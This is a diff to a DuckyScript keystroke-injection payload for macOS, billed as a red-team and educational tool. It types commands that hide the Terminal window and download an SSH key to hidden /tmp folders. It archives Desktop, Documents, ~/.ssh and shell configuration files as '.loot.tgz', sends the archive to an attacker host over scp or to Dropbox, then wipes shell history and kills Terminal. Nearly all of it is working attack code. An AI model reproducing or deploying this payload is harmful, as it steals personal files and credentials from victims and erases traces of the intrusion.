@@ -4,30 +4,33 @@ REM Description: The script will compress the Desktop and Documents folders in a
 REM Notes: This script was created to help with a red-team engagements requiring actual data as evidence. This payload has been created ONLY for educational purposes.
 REM Target: MacOS 11.0+ (Built-in ssh/scp)
 REM Version: 1.1
+REM Test: Macbook Pro 2019/2020 - Adjust the DELAY times based on your hardware.
+REM Tested with OM.G cable, but should work for any duckyscript capable device.
 
 REM DELAY 100
 REM GUI m
 DELAY 500
 GUI SPACE
 DELAY 200
-STRING Terminal
-DELAY 100
+STRING terminal
+DELAY 300
+ENTER
+
+DELAY 500
+STRING bash 
 ENTER
 
 REM ##############################################################
 REM # Shrink and move the console window to the top right corner #
 REM ##############################################################
 DELAY 300
-STRING osascript -e 'tell application "Terminal" to set bounds of front window to {2500, 50, 20, 20}' ; clear &&
-ENTER
-DELAY 300
-STRING clear
+STRING osascript -e 'tell application "Terminal" to set bounds of front window to {2500, 50, 20, 20}' && clear
 ENTER
 
 REM #################################################
 REM # Download the ssh private key from the set URL #
 REM #################################################
-STRING mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://<url to private key> -o /tmp/.s/.t/.e/.a/.l/.s && chmod 600 /tmp/.s/.t/.e/.a/.l/.s && clear
+STRING mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://<SSH KEY URL>/<KEY FILE NAME> -o /tmp/.s/.t/.e/.a/.l/.s && chmod 600 /tmp/.s/.t/.e/.a/.l/.s && clear
 ENTER
 DELAY 300
 
@@ -39,7 +42,7 @@ REM ############################################################################
 STRING cd /tmp/.s/.t/.e/.a/.l && clear && \
 DELAY 200
 ENTER
-STRING find . ~/Downloads >> Downloads.list && find ~/ >> home_dir_file_list.txt && tar cfz .loot.tgz ~/Documents ~/.ssh ~/.bash* ~/.config ~/.zsh* Downloads.list home_dir_file_list.txt &
+STRING tar cfz .loot.tgz ~/Desktop ~/Documents ~/.ssh ~/.bash* ~/.config ~/.zsh* &
 DELAY 200
 ENTER
 
@@ -50,30 +53,28 @@ REM # NOTE: The payload is configured to use SSH as the protcol for the file tra
 REM ##########################################################################################################################################################################
 
 REM ## The SCP way ##
-REM ## Usage: Replace the <port>, <attaccker username>, <attacker hostname> and <remote storage path> with the credentials, hostname and path on the remote SCP server   
+REM ## Usage: Replace the <port>, <attaccker username>, <attacker hostname> and <remote storage path> with the credentials, hostname and path on the remote SCP server
 REM ------------------------------------------------------------------------------------------------------------------------------------------------------------------
-STRING wait %1 && clear && scp -q -P <port> -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz <ssh username>@<attacker hostname>:<remote storage path> \ 
-ENTER 
 DELAY 300
-STRING set -e && rm -rf /tmp/.s ~/.bash_hstory ~/.zsh_history && history -c && exit
+STRING wait %1 && clear && scp -q -P <PORT> -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz <attacker username>@<attackerhostname?:<remote storage path> && \ 
+ENTER
+DELAY 300
+STRING clear && set -x && rm -rf /tmp/.s ~/.bash_history ~/.zsh_history && killall Terminal
+DELAY 300
 ENTER
 
 
 REM ## The Dropbox way ##
-REM ## Usage: Replace the <ACCESS TOKEN> field with you access token, and replace the <DROPBOX DIRECTORY> field with the path where to store the looted file. 
+REM ## Usage: Replace the <ACCESS TOKEN> field with you access token, and replace the <DROPBOX DIRECTORY> field with the path where to store the looted file.
 REM ---------------------------------------------------------------------------------------------------------------------------------------------------------
 REM STRING wait %1 && clear && curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer <ACCESS_TOKEN>" --header "Dropbox-API-Arg: {\"path\": \"/<DROPBOX DIRECTORY>\"}" --header "Content-Type: application/octet-stream" --data-binary @/tmp/.s/.t/.e/.a/.l/.loot.tgz
-DELAY 100
+REM DELAY 100
 REM ENTER
 REM DELAY 300
-REM STRING set -e && rm -rf /tmp/.s ~/.bash_hstory ~/.zsh_history && history -c && clear && exit
+REM STRING set -e && rm -rf /tmp/.s ~/.bash_history ~/.zsh_history && history -c && clear && exit 1
 REM ENTER
 
-
-REM #####################################
-REM # Minimize the window during upload #
-REM #####################################
-DELAY 500
+DELAY 300
 GUI m
-DELAY 200
+DELAY 300
 GUI TAB
